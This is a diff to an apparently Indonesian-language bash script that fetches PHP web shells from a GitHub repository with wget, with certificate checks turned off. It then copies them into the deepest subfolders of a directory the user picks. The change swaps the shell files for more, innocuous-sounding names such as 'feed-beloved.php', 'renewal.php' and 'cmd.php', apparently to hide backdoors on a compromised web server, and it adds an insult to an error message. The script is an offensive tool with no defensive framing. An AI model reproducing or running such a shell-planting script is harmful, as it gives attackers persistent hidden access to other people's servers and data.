@@ -21,7 +21,7 @@ select target_folder in */; do
         show_deepest_folders "$target_folder"
         break
     else
-        echo -e "\e[31mPilih yang bener dong.\e[0m"
+        echo -e "\e[31mPilih yang bener dong bajingan tengik.\e[0m"
     fi
 done
 
@@ -33,9 +33,11 @@ sleep 3
 mkdir x
 
 echo -e "\e[32mMengunduh shell ke dalam folder 'x'...\e[0m"
-wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/xf.php
-wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/us.php
-wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/hd.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/feed-beloved.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/php-function.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/renewal.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/cmd.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/function.php
 
 echo -e "\e[32mMenyalin shell ke dalam folder tujuan...\e[0m"
 for file in x/*.php; do
